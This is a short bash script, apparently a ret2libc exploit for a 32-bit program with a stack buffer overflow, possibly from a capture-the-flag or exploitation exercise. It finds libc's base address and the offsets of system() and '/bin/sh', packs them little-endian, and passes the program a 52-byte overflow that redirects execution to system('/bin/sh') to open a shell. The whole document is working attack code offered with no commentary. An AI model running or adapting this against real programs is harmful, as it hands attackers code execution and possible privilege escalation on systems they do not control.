#!/bin/bash

# Get all the addresses
TARGET="$(readlink -f $1)"
LIBC_INFO="$(ldd $TARGET | grep libc)"
LIBC_BASE="$(awk '{ print $NF }' <<<"$LIBC_INFO" | tr -cd '[x0-9a-f]')"
LIBC_FILE="$(awk '{ print $3 }' <<<"$LIBC_INFO")"
SYSTEM_OFFSET="0x$(readelf -a $LIBC_FILE | grep -m1 "system@" | awk '{ print $2 }')"
SYSTEM_ADDR="$(printf "0x%08x" $((LIBC_BASE + SYSTEM_OFFSET)))"
BIN_SH_OFFSET="$(grep -oba '/bin/sh' $LIBC_FILE | cut -d':' -f1)"
BIN_SH_ADDR="$(printf "0x%08x" $((LIBC_BASE + BIN_SH_OFFSET)))"

# Construct exploit string
RET_ADDR="$(sed -r 's/^0x(..)(..)(..)(..)$/\\x\4\\x\3\\x\2\\x\1/' <<<"$SYSTEM_ADDR")"
PAYLOAD_ADDR="$(sed -r 's/^0x(..)(..)(..)(..)$/\\x\4\\x\3\\x\2\\x\1/' <<<"$BIN_SH_ADDR")"

# Exploit
$TARGET $(perl -e "print 'A' x 52 . \"$RET_ADDR\" . \"JUNK\" . \"$PAYLOAD_ADDR\"")
